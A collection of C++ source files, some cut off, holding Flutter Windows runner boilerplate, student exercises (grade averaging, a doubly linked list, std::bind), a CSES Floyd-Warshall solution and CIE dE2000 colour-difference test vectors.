    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"anime\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nstruct Estudiante {\r\n    int id;\r\n    string nombres;\r\n    string apellidos;\r\n    double notas[4];\r\n};\r\n\r\nvoid calcularPromedio(Estudiante& estudiante) {\r\n    double suma = 0;\r\n    for (int i = 0; i < 4; ++i) {\r\n        suma += estudiante.notas[i];\r\n    }\r\n    double promedio = suma / 4.0;\r\n    cout << \"El promedio de \" << estudiante.nombres << \" \" << estudiante.apellidos << \" es: \" << promedio << endl;\r\n    if (promedio > 60) {\r\n        cout << \"\u00a1Estudiante aprobado!\" << endl;\r\n    } else {\r\n        cout << \"Estudiante reprobado.\" << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    int n;\r\n    cout << \"Ingrese la cantidad de estudiantes: \";\r\n    cin >> n;\r\n\r\n    Estudiante estudiantes[n];\r\n\r\n    for (int i = 0; i < n; ++i) {\r\n        cout << \"Ingrese el ID del estudiante \" << i+1 << \": \";\r\n        cin >> estudiantes[i].id;\r\n        cin.ignore(); // Limpiar el buffer del teclado\r\n        cout << \"Ingrese el nombre del estudiante \" << i+1 << \": \";\r\n        getline(cin, estudiantes[i].nombres);\r\n        cout << \"Ingrese el apellido del estudiante \" << i+1 << \": \";\r\n        getline(cin, estudiantes[i].apellidos);\r\n        cout << \"Ingrese las notas (separadas por espacio) del estudiante \" << i+1 << \": \";\r\n        for (int j = 0; j < 4; ++j) {\r\n            cin >> estudiantes[i].notas[j];\r\n        }\r\n    }\r\n\r\n    cout << \"\\nResultados:\\n\" << endl;\r\n\r\n    for (int i = 0; i < n; ++i) {\r\n        calcularPromedio(estudiantes[i]);\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bitcoin_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Shortest Routes II\n// https://cses.fi/problemset/task/1672/\n\n#include <bits/stdc++.h>\nusing namespace std;\nconst long long INF = 10e17;\nint main()\n{\n\n\t// Read variables\n\tint n, m, q;\n\tcin >> n >> m >> q;\n\n\t// Build graph from input\n\tvector<vector<pair<int, long long>>> adjacency_list(n + 1);\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tint source, destination;\n\t\tint weight;\n\t\tcin >> source >> destination >> weight;\n\t\tadjacency_list[source].push_back(make_pair(destination, weight));\n\t\tadjacency_list[destination].push_back(make_pair(source, weight));\n\t}\n\n\t// Floyd-Warshal - Initial distance\n\tvector<vector<long long>> distance(n + 1, vector<long long>(n + 1, INF));\n\tfor (int source = 1; source <= n; source++)\n\t{\n\t\tdistance[source][source] = 0;\n\t\tfor (auto &[destination, weight] : adjacency_list[source])\n\t\t{\n\t\t\tdistance[source][destination] = min(distance[source][destination], weight);\n\t\t}\n\t}\n\n\t// Floyd-Warshal - Find shortest distance\n\tfor (int intermidiate = 1; intermidiate <= n; intermidiate++)\n\t{\n\t\tfor (int source = 1; source <= n; source++)\n\t\t{\n\t\t\tfor (int destination = 1; destination <= n; destination++)\n\t\t\t{\n\t\t\t\tlong long direct_path_distance = distance[source][destination];\n\t\t\t\tlong long alternative_path_distance = distance[source][intermidiate] + distance[intermidiate][destination];\n\t\t\t\tdistance[source][destination] = min(direct_path_distance, alternative_path_distance);\n\t\t\t}\n\t\t}\n\t}\n\n\t// Process queries\n\tfor (int query = 0; query < q; query++)\n\t{\n\t\tint origin, destination;\n\t\tcin >> origin >> destination;\n\t\tif (distance[origin][destination] == INF)\n\t\t{\n\t\t\tdistance[origin][destination] = -1;\n\t\t}\n\t\tcout << distance[origin][destination] << endl;\n\t}\n\n\treturn 0;\n}\n",
    "#include <iostream>\nusing namespace std;\n\nstruct Node\n{\n    int noMhs;\n    string name;\n    Node *next;\n    Node *prev;\n};\n\nNode *START = NULL;\n\nvoid addNode()\n{\n    Node *newNode = new Node();\n    cout << \"\\nEnter the roll number of the student: \";\n    cin >> newNode->noMhs;\n    cout << \"\\nEnter the name of the student: \";\n    cin >> newNode->name;\n\n    if (START == NULL || newNode->noMhs <= START->noMhs)\n    {\n        if (START != NULL && newNode->noMhs == START->noMhs)\n        {\n            cout << \"\\033[31mDuplicate roll numbers not allowed\\033[0m\" << endl;\n            return;\n        }\n\n        newNode->next = START;\n        if (START != NULL)\n        {\n            START->prev = newNode;\n        }\n        newNode->prev = NULL;\n        START = newNode;\n    }\n    else\n    {\n        Node *current = START;\n        Node *previous = NULL;\n\n        while (current != NULL && current->noMhs < newNode->noMhs)\n        {\n            previous = current;\n            current = current->next;\n        }\n\n        newNode->next = current;\n        newNode->prev = previous;\n\n        if (current != NULL)\n        {\n            current->prev = newNode;\n        }\n        if (previous != NULL)\n        {\n            previous->next = newNode;\n        }\n        else{\n            START = newNode;\n        }\n\n    }\n\n}\n\nbool search(int rollNo, Node **previous, Node **current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = *current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\n\nvoid deleteNode()\n{\n    Node *previous, *current;\n    int rollNo;\n\n    cout << \"\\nEnter the roll number of the student whose record is to be deleted:\";\n    cin >> rollNo;\n\n    if (START == NULL)\n    {\n        cout << \"List is empty\" << endl;\n        return;\n    }\n\n    current = START;\n    previous = NULL;\n\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        previous = current;\n        current = current->next;\n    }\n    if (current == NULL)\n    {\n        cout << \"\\033[31mThe record with roll number \" << rollNo << \"not found\\033[0m\" <<endl;\n        return;\n    }\n\n    if (current == START)\n    {\n        START = START->next;\n        if (START != NULL)\n        {\n            START->prev = NULL;\n        }\n    }\n    else \n    {\n        previous->next = current->next;\n        if (current->next != NULL)\n        {\n            current->next->prev = previous;\n        }\n    }\n    delete current;\n    cout << \"\\x1b{32mRecord with roll number\" << rollNo << \"deleted\\x1b[0m\" << endl;\n\n\n}\n\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n    cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nrecords in ascending order of roll number are:\" << endl;\n        Node *currentNode = START;\n        while (currentNode != NULL)\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;\n            currentNode = currentNode->next;\n        }\n    }\n}\n\nvoid revtraverse()\n{\n    if (listEmpty())\n    cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in descending order of roll number are:\" << endl;\n        Node *currentNode = START;\n        while (currentNode->next != NULL)\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;\n            currentNode = currentNode->prev;\n        }\n    }\n}\n\nvoid searchData()\n{\n    if (listEmpty() == true)\n    {\n        cout << \"\\nList is empty\" << endl;\n    }\n    Node *prev, *curr;\n    prev = curr = NULL;\n    cout << \"\\nEnter the roll number of the student whose record you want to search:\";\n    int num;\n    cin >> num;\n    if (search(num, &prev, &curr) == false)\n    cout << \"\\nRecord not found\" << endl;\n    else\n    {\n        cout << \"\\nRecord found\" << endl;\n        cout << \"\\nRoll number: \" << endl;\n        cout << \"\\nName:\" << endl;\n    }\n}\n\nint main()\n{\n    while (true)\n   {\n    try\n    {\n        cout << \"\\nMenu\" << endl;\n        cout << \"1. Add a record from the list\" << endl;\n        cout << \"2. Delete a record from the list\" << endl;\n        cout << \"3. View all records in ascending order of roll numbers\" << endl;\n        cout << \"4. View all records in descending order of roll numbers\" << endl;\n        cout << \"5. Search for a record in the list \" << endl;\n        cout << \"6. Exit\" << endl;\n        cout << \"\\nEnter your choice (1-6):\";\n        char ch;\n        cin >> ch;\n\n        switch (ch)\n        {\n            case '1':\n                addNode();\n                break;\n            case '2':\n                deleteNode();\n                break;\n            case '3':\n                traverse();\n                break;\n            case '4':\n                revtraverse();\n                break;\n            case '5':\n                searchData();\n                break;\n            case '6':\n                return 0;\n            default:\n                cout << \"\\nInvalid option\" << endl;\n  ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <cstring>\n#include <iostream>\n#include <functional>\n#include <list>\n/*\n    1. we connot massively change code after it is deployed for clinet\n    2. sometime api parameters need to be fixed at a certain value\n*/\n\nvoid Formula(const int x, const int y, const int z)\n{\n    std::cout << \"Answer : \" << ((x + y) - z) << '\\n';\n}\n\nvoid Magic(const std::list<int> &data, int n)\n{\n    for (int val : data)\n    {\n        n--;\n        if (n == 0)\n        {\n            std::cout <<\"The value in the given list :- \" << val << '\\n';\n        }\n    }\n}\n\n\n\nint main()\n{\n    Formula(10, 30, 20);\n    auto binded_formula = std::bind(&Formula, 100, std::placeholders::_1, std::placeholders::_2);\n    binded_formula(30, 120);\n\n    auto binded_Magic = std::bind(&Magic, std::placeholders::_2, std::placeholders::_1);\n\n    auto binded_strcpy = std::bind(&strcpy, std::placeholders::_2, std::placeholders::_1);\n\n    char* msg = new char[30];\n    binded_strcpy(\"Satyam\",msg);\n    std::cout<<\"msg : \"<<msg<<'\\n';\n    std::list<int> lst = {1,2,3,4,5};\n    binded_Magic(2,lst);\n\n    auto fn = [](int number, int factor){std::cout<<\"The multiple :- \"<<number*factor<<'\\n';};\n\n    // a lambda is a object. using & on a lambda means taking address of object. Don't use & sign with lambda in bind\n\n    auto binded_lambda_fn = std::bind(fn,std::placeholders::_1,40);\n\n    binded_lambda_fn(100);\n\n    delete[] msg;\n}\n\n/* A function variable stores the address of first instruction as the array stores the address of first element */\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <cmath>\n#include <cstdio>\n\nstruct XYZ {\n    double x;\n    double y;\n    double z;\n};\n\n// Use these values for D65 whitepoint.\n// published values vary slightly, and will affect the results.\nXYZ d65WhitePoint = { 95.0489, 100.0, 108.8840};\n\n\n// This function should implement the CIE dE 2000 colour difference\ndouble deltaE_CIE2000(const XYZ& a, const XYZ& b);\n\n\nstruct TestVector {\n    int id;\n    XYZ a;\n    XYZ b;\n    double dE;\n};\n\nTestVector tests[] = {\n    {  1, {       18.0,  18.421875,   98.71875 }, {       17.5,  18.421875, 103.328125 }, 2.0428693215228901 },\n    {  2, {   18.09375,  18.421875,  94.953125 }, {       17.5,  18.421875, 103.328125 }, 2.8704685611441016 },\n    {  3, {   18.03125,  18.421875,  90.171875 }, {       17.5,  18.421875, 103.328125 }, 3.44367359586365 },\n    {  4, {      17.25,  18.421875, 105.765625 }, {       17.5,  18.421875, 103.328125 }, 0.98953039312009172 },\n    {  5, {   17.28125,  18.421875, 106.609375 }, {       17.5,  18.421875, 103.328125 }, 1.0029552436525526 },\n    {  6, {   17.34375,  18.421875, 107.765625 }, {       17.5,  18.421875, 103.328125 }, 0.97417324220258006 },\n    {  7, {       17.5,  18.421875,    20.0625 }, {  17.328125,  18.421875,  19.015625 }, 2.3224208445484056 },\n    {  8, {  17.328125,  18.421875,  19.015625 }, {       17.5,  18.421875,    20.0625 }, 2.3224208445484056 },\n    {  9, {   17.96875,  18.421875,    20.0625 }, {  17.046875,  18.421875,  20.046875 }, 7.2394063666101118 },\n    { 10, {   17.96875,  18.421875,    20.0625 }, {  17.046875,  18.421875,  20.046875 }, 7.2394063666101118 },\n    { 11, {   17.96875,  18.421875,    20.0625 }, {  17.046875,  18.421875,  20.046875 }, 7.2394063666101118 },\n    { 12, {   17.96875,  18.421875,    20.0625 }, {  17.046875,  18.421875,  20.046875 }, 7.2394063666101118 },\n    { 13, {       17.5,  18.421875,  18.765625 }, {       17.5,  18.421875,   21.40625 }, 4.8166832023426167 },\n    { 14, {       17.5,  18.421875,  18.765625 }, {       17.5,  18.421875,   21.40625 }, 4.8166832023426167 },\n    { 15, {       17.5,  18.421875,  18.765625 }, {       17.5,  18.421875,   21.40625 }, 4.8166832023426167 },\n    { 16, {   17.96875,  18.421875,    20.0625 }, {       17.5,  18.421875,   21.40625 }, 4.3294648525052608 },\n    { 17, {   17.96875,  18.421875,    20.0625 }, {     51.875,  45.171875,   68.59375 }, 27.160687903094356 },\n    { 18, {   17.96875,  18.421875,    20.0625 }, {    26.5625,      29.25,  15.203125 }, 22.874523554449674 },\n    { 19, {   17.96875,  18.421875,    20.0625 }, {  17.296875,   23.90625,   27.96875 }, 31.784604209825009 },\n    { 20, {   17.96875,  18.421875,    20.0625 }, {  30.671875,   25.96875,  19.421875 }, 19.476261849382428 },\n    { 21, {   17.96875,  18.421875,    20.0625 }, {   18.09375,  18.421875,      19.75 }, 0.99603164263017707 },\n    { 22, {   17.96875,  18.421875,    20.0625 }, {     18.125,  18.421875,    20.0625 }, 1.0414923919236823 },\n    { 23, {   17.96875,  18.421875,    20.0625 }, {  17.859375,  18.421875,      19.75 }, 0.95305102475035275 },\n    { 24, {   17.96875,  18.421875,    20.0625 }, {  18.109375,  18.421875,     19.875 }, 0.99326866414194748 },\n    { 25, {  19.453125,   28.40625,      11.75 }, {  19.609375,  28.640625,  10.734375 }, 1.2804838792912299 },\n    { 26, {   22.53125,   31.59375,  39.046875 }, {  22.640625,     31.375,  37.328125 }, 1.2730197313816478 },\n    { 27, {    29.0625,  29.578125,   36.28125 }, {   28.84375,  29.734375,     36.125 }, 1.8229382999799022 },\n    { 28, {    4.15625,   8.546875,   8.140625 }, {   4.421875,   8.515625,   8.765625 }, 1.841290832234854 },\n    { 29, {    4.96875,    3.71875,     19.875 }, {   4.671875,     3.8125,  18.046875 }, 2.075123140549433 },\n    { 30, {  15.640625,       9.25,    5.09375 }, {  15.953125,    9.15625,   4.453125 }, 1.4155796660121873 },\n    { 31, {    73.1875,  78.046875,       83.0 }, {     74.125,    78.8125,  85.765625 }, 1.458222602968178 },\n    { 32, {    74.1875,    78.3125,    86.5625 }, {   69.34375,   73.40625,  80.890625 }, 1.5635548124666301 },\n    { 33, {   0.703125,       0.75,   0.984375 }, {   0.609375,    0.65625,   0.859375 }, 0.6553561450639207 },\n    { 34, {    0.21875,   0.234375,   0.328125 }, {    0.09375,    0.09375,   0.140625 }, 